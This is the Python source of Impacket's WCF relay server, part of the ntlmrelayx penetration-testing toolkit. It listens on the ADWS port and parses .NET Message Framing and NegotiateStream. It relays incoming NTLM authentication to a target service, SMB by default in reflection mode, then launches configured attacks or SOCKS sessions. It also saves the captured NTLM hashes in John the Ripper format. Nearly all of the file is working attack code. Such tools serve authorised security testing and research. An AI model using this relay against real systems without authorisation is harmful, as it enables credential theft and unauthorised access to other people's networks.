# -*- coding: utf-8 -*-
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   WCF Relay Server
#
#   This is the WCF server (ADWS too) which relays the NTLMSSP messages to other protocols
#   Only NetTcpBinding is supported!
#
# Author:
#   Clément Notin (@cnotin)
#   With code copied from smbrelayserver.py and httprelayserver.py authored by:
#     Alberto Solino (@agsolino)
#     Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# References:
#   To support NetTcpBinding, this implements the ".NET Message Framing Protocol" [MC-NMF] and
#   ".NET NegotiateStream Protocol" [MS-NNS]
#   Thanks to inspiration from https://github.com/ernw/net.tcp-proxy/blob/master/nettcp/nmf.py
#   and https://github.com/ernw/net.tcp-proxy/blob/master/nettcp/stream/negotiate.py by @bluec0re
#

import socket
import socketserver
import struct
from binascii import hexlify
from threading import Thread

from six import PY2

from impacket import ntlm, LOG
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.spnego import SPNEGO_NegTokenInit, ASN1_AID, SPNEGO_NegTokenResp, TypesMech, MechTypes, \
    ASN1_SUPPORTED_MECH


class WCFRelayServer(Thread):
    class WCFServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        def __init__(self, server_address, request_handler_class, config):
            self.config = config
            self.daemon_threads = True
            if self.config.ipv6:
                self.address_family = socket.AF_INET6
            self.wpad_counters = {}
            socketserver.TCPServer.__init__(self, server_address, request_handler_class)

    class WCFHandler(socketserver.BaseRequestHandler):
        def __init__(self, request, client_address, server):
            self.server = server
            self.challengeMessage = None
            self.target = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None

            if self.server.config.target is None:
                # Reflection mode, defaults to SMB at the target, for now
                self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
            self.target = self.server.config.target.getTarget()
            if self.target is None:
                LOG.info("WCF: Received connection from %s, but there are no more targets left!" % client_address[0])
                return
            LOG.info("WCF: Received connection from %s, attacking target %s://%s" % (
                client_address[0], self.target.scheme, self.target.netloc))

            socketserver.BaseRequestHandler.__init__(self, request, client_address, server)

        # recv from socket for exact 'length' (even if fragmented over several packets)
        def recvall(self, length):
            buf = b''
            while not len(buf) == length:
                buf += self.request.recv(length - len(buf))

            if PY2:
                buf = bytearray(buf)
            return buf

        def handle(self):
            version_code = self.recvall(1)
            if version_code != b'\x00':
                LOG.error("WCF: wrong VersionRecord code")
                return
            version = self.recvall(2)  # should be \x01\x00 but we don't care
            if version != b'\x01\x00':
                LOG.error("WCF: wrong VersionRecord version")
                return

            mode_code = self.recvall(1)
            if mode_code != b'\x01':
                LOG.error("WCF: wrong ModeRecord code")
                return
            mode = self.recvall(1)  # we don't care

            via_code = self.recvall(1)
            if via_code != b'\x02':
                LOG.error("WCF: wrong ViaRecord code")
                return
            via_len = self.recvall(1)
            via_len = struct.unpack("B", via_len)[0]
            via = self.recvall(via_len).decode("utf-8")

            if not via.startswith("net.tcp://"):
                LOG.error("WCF: the Via URL '" + via + "' does not start with 'net.tcp://'. "
                                                       "Only NetTcpBinding is currently supported!")
                return

            known_encoding_code = self.recvall(1)
            if known_encoding_code != b'\x03':
                LOG.error("WCF: wrong KnownEncodingRecord code")
                return
            encoding = self.recvall(1)  # we don't care

            upgrade_code = self.recvall(1)
            if upgrade_code != b'\x09':
                LOG.error("WCF: wrong UpgradeRequestRecord code")
                return
            upgrade_len = self.recvall(1)
            upgrade_len = struct.unpack("B", upgrade_len)[0]
            upgrade = self.recvall(upgrade_len).decode("utf-8")

            if upgrade != "application/negotiate":
                LOG.error("WCF: upgrade '" + upgrade + "' is not 'application/negotiate'. Only Negotiate is supported!")
                return
            self.request.sendall(b'\x0a')

            while True:
                handshake_in_progress = self.recvall(5)
                if not handshake_in_progress[0] == 0x16:
                    LOG.error("WCF: Wrong handshake_in_progress message")
                    return

                securityBlob_len = struct.unpack(">H", handshake_in_progress[3:5])[0]
                securityBlob = self.recvall(securityBlob_len)

                rawNTLM = False
                if struct.unpack('B', securityBlob[0:1])[0] == ASN1_AID:
                    # SPNEGO NEGOTIATE packet
                    blob = SPNEGO_NegTokenInit(securityBlob)
                    token = blob['MechToken']
                    if len(blob['MechTypes'][0]) > 0:
                        # Is this GSSAPI NTLM or something else we don't support?
                        mechType = blob['MechTypes'][0]
                        if mechType != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
                                mechType != TypesMech['NEGOEX - SPNEGO Extended Negotiation Security Mechanism']:
                            # Nope, do we know it?
                            if mechType in MechTypes:
                                mechStr = MechTypes[mechType]
                            else:
                                mechStr = hexlify(mechType)
                            LOG.error("Unsupported MechType '%s'" % mechStr)
                            # We don't know the token, we answer back again saying
                            # we just support NTLM.
                            respToken = SPNEGO_NegTokenResp()
                            respToken['NegState'] = b'\x03'  # request-mic
                            respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']
                            respToken = respToken.getData()

                            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nns/3e77f3ac-db7e-4c76-95de-911dd280947b
                            answer = b'\x16'  # handshake_in_progress
                            answer += b'\x01\x00'  # version
                            answer += struct.pack(">H", len(respToken))  # len
                            answer += respToken

                            self.request.sendall(answer)

                elif struct.unpack('B', securityBlob[0:1])[0] == ASN1_SUPPORTED_MECH:
                    # SPNEGO AUTH packet
                    blob = SPNEGO_NegTokenResp(securityBlob)
                    token = blob['ResponseToken']
                    break
                else:
                    # No GSSAPI stuff, raw NTLMSSP
                    rawNTLM = True
                    token = securityBlob
                    break

            if not token.startswith(b"NTLMSSP\0\1"):  # NTLMSSP_NEGOTIATE: message type 1
                LOG.error("WCF: Wrong NTLMSSP_NEGOTIATE message")
                return

            if not self.do_ntlm_negotiate(token):
                # Connection failed
                LOG.error('Negotiating NTLM with %s://%s failed. Skipping to next target',
                          self.target.scheme, self.target.netloc)
                self.server.config.target.logTarget(self.target)
                return

            # Calculate auth
            ntlmssp_challenge = self.challengeMessage.getData()

            if not rawNTLM:
                # add SPNEGO wrapping
                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegState'] = b'\x01'
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = ntlmssp_challenge
                ntlmssp_challenge = respToken.getData()

            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nns/3e77f3ac-db7e-4c76-95de-911dd280947b
            handshake_in_progress = b"\x16\x01\x00" + struct.pack(">H", len(ntlmssp_challenge))
            self.request.sendall(handshake_in_progress)
            self.request.sendall(ntlmssp_challenge)

            handshake_done = self.recvall(5)

            if handshake_done[0] == 0x15:
                error_len = struct.unpack(">H", handshake_done[3:5])[0]
                error_msg = self.recvall(error_len)
                hresult = hex(struct.unpack('>I', error_msg[4:8])[0])
                LOG.error("WCF: Received handshake_error message: " + hresult)
                return

            ntlmssp_auth_len = struct.unpack(">H", handshake_done[3:5])[0]
            ntlmssp_auth = self.recvall(ntlmssp_auth_len)

            if not rawNTLM:
                # remove SPNEGO wrapping
                blob = SPNEGO_NegTokenResp(ntlmssp_auth)
                ntlmssp_auth = blob['ResponseToken']

            if not ntlmssp_auth.startswith(b"NTLMSSP\0\3"):  # NTLMSSP_AUTH: message type 3
                LOG.error("WCF: Wrong NTLMSSP_AUTH message")
                return

            authenticateMessage = ntlm.NTLMAuthChallengeResponse()
            authenticateMessage.fromString(ntlmssp_auth)

            if not self.do_ntlm_auth(ntlmssp_auth, authenticateMessage):
                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))
                else:
                    LOG.error("Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('ascii'),
                        authenticateMessage['user_name'].decode('ascii')))
                return

            # Relay worked, do whatever we want here...
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc,
                    authenticateMessage['domain_name'].decode('utf-16le'),
                    authenticateMessage['user_name'].decode('utf-16le')))
            else:
                LOG.info("Authenticating against %s://%s as %s\\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('ascii'),
                    authenticateMessage['user_name'].decode('ascii')))

            ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                authenticateMessage['user_name'],
                                                authenticateMessage['domain_name'],
                                                authenticateMessage['lanman'], authenticateMessage['ntlm'])
            self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

            if self.server.config.outputFile is not None:
                writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                      self.server.config.outputFile)

            self.server.config.target.logTarget(self.target, True, self.authUser)

            self.do_attack()

        def do_ntlm_negotiate(self, token):
            if self.target.scheme.upper() in self.server.config.protocolClients:
                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config,
                                                                                             self.target)
                # If connection failed, return
                if not self.client.initConnection():
                    return False
                self.challengeMessage = self.client.sendNegotiate(token)

                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                if self.server.config.remove_target:
                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())

                # Check for errors
                if self.challengeMessage is False:
                    return False
            else:
                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
                return False

            return True

        def do_ntlm_auth(self, token, authenticateMessage):
            # For some attacks it is important to know the authenticated username, so we store it
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                            authenticateMessage['user_name'].decode('utf-16le'))).upper()
            else:
                self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
                                            authenticateMessage['user_name'].decode('ascii'))).upper()

            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                clientResponse, errorCode = self.client.sendAuth(token)
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                # when coming from localhost
                errorCode = STATUS_ACCESS_DENIED

            if errorCode == STATUS_SUCCESS:
                return True

            return False

        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                       self.authUser, self.client, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() in self.server.config.attacks:
                # We have an attack.. go for it
                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config,
                                                                                      self.client.session,
                                                                                      self.authUser)
                clientThread.start()
            else:
                LOG.error('No attack configured for %s' % self.target.scheme.upper())

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):
        LOG.info("Setting up WCF Server")

        if self.config.listeningPort:
            wcfport = self.config.listeningPort
        else:
            wcfport = 9389  # ADWS

        # changed to read from the interfaceIP set in the configuration
        self.server = self.WCFServer((self.config.interfaceIp, wcfport), self.WCFHandler, self.config)

        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            pass
        LOG.info('Shutting down WCF Server')
        self.server.server_close()
